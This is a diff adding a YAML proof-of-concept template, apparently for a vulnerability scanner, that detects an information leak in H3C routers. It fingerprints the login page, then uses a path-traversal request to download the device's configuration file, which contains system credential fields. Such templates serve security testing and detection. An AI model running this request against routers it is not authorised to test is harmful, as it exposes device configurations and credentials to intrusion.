@@ -1,0 +1,19 @@
+id: poc-yaml-h3c-router-actionpolicy-status-info-leak
+info:
+  name: H3C 路由器 actionpolicy_status 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: H3C 路由器
+requests:
+- method: GET
+  path: /userLogin.asp
+  expression: status_code == 200 && contains(headers,"H3C")
+  output:
+  - regex_match(body,"<title>(?P<version>.*?)ϵͳ")
+- method: GET
+  path: /userLogin.asp/../actionpolicy_status/../{{.version}}.cfg
+  expression: status_code == 200 && contains(body,"addr-pool-dx-addr=") && contains(body,"$sys")
+    && !contains(body,"<") && contains(content_type,"application/x-unknown")
+variables: {}
+transport: http
